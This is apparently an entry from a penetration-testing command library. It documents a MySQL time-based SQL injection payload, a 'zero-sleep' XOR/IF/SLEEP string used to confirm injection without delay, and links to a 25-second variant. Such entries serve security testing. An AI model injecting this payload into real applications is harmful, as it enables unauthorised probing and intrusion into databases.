---
id: cmd-sql-no-sleep
data: 'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
tags:
  - sqli
  - payload
  - sleep
type: command
output: No delay on execution
executor: sql
platforms:
  - MySQL
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.332Z'
verified: false
validated: true
submitted: true
---
# sql-payload-no-sleep

## Command

```sql
XOR(if(now()=sysdate(),sleep(5*5*0),0))OR
```

## Description

Zero-sleep variant for SQLi confirmation without timing impact.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sleep(5*5*0)` | Evaluates to SLEEP(0) | Yes |

## Examples

### Basic Usage

```sql
XOR(if(true,sleep(0),0))OR
```

## Expected Output

Immediate execution, no pause.

## Related

- [[commands/sql-payload-25s-sleep]]
